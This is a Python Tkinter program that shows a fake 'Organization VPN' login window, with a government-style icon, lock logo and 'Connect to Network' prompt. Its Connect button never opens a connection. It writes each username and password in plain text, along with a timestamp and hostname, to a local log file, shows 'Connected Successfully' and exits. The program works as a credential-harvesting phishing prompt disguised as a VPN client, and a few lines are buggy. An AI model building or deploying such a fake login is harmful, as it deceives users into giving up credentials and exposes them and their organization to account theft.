from datetime import datetime
from tkinter import *
import socket

class LoginFrame(Frame):
        def __init__(self, root):
                Frame.__init__(self,root)
                self.data = StringVar(self, 'Please enter your details')
                self.logo_image = PhotoImage(file='lock.png')
                self.logo_image = self.logo_image.subsample(5, 5)
                self.image = PhotoImage(file='image.png')
                self.image = self.image.subsample(3, 3)
                self.create_widgets() #create all widgets
                self.current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                self.host = socket.gethostname()

                #just as a reminder for the layout to make sure there is no overlap 

                '''
                c
                x x x r
                x x x
                x x x

                '''
        def clear_frame(self): #clears the previous frame
                for widget in self.winfo_children():
                        widget.destroy()

        
        def create_widgets(self):
                self.clear_frame()
                #Label and Entries
                self.title = Label(self, text=" VPN \n Connect to Network")
                self.user_name = Label(self, text="Username")
                self.name = Entry(self,width = 15)

                self.label_password = Label(self, text="Password")
                self.password = Entry(self,width = 15,show="*" )
                
                self.button_add = Button(self, text = "Connect", command = self.add)
                
                self.image_label = Label(self, image=self.image)
                self.logo_label = Label(self, image=self.logo_image)
                self.mess = Label(self,textvariable = self.data)

                #Layout Manager
                
                self.logo_label.grid(row=0, column=0)
                self.title.grid(row=0, column=1)
                self.user_name.grid(row=1, column = 0)
                self.name.grid(row=1, column = 1)
                self.label_password.grid(row=2, column=0)
                self.password.grid(row=2, column=1)
                self.button_add.grid(row=4, column=1,rowspan = 2)
                self.mess.grid(row=5, column=0)

                


        def add(self):
                a = self.name.get()
                b = self.password.get()
                # if the entry is not blank write to log file
                if len(a) > 0 and len(b) > 0:
                        res = 'Timestamp: ' +str(self.current_time) + ' '+ 'Hostname: ' + str(self.host)+ ' ' +'Username: ' + str(a) + ' Password: ' + str(b) + '\n'
                        try:
                            with open('resultf.log', 'a') as fi:
                                fi.write(res)
                                self.data.set('Connecting')
                                self.after(2000, self.show_finished_screen)
                        except IOError as e:
                           return ' '
                       
                        # Clear input fields after successful addition
                        self.name.delete(0,END)
                        self.password.delete(0,END)
                else:
                        self.data.set('Username and Password are required')
        
       
        def show_finished_screen(self):
        # Remove existing widgets from the frame
                for widget in self.winfo_children():
                    widget.grid_remove()

        # Display the "Connect Successfully" message
                finished_label = Label(self, text="Connected Successfully", font=('Helvetica', 12, 'bold'))
                image_label = Label(self, image=self.image)
                self.image_label.grid(row=1, column=0)
                finished_label.grid(row=0, column=0, padx=10, pady=10)
                self.after(2000, self.quit())


               


#driver Code              
root = Tk()
w = 350
h = 150
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x_pos = screen_width - 350 - 10
y_pos = screen_height - 150 - 70
root.geometry(f"{w}x{h}+{x_pos}+{y_pos}")
root.iconbitmap('gov.ico')
Frame = LoginFrame(root)
root.title('Organization VPN | User')
Frame.pack()
root.mainloop()
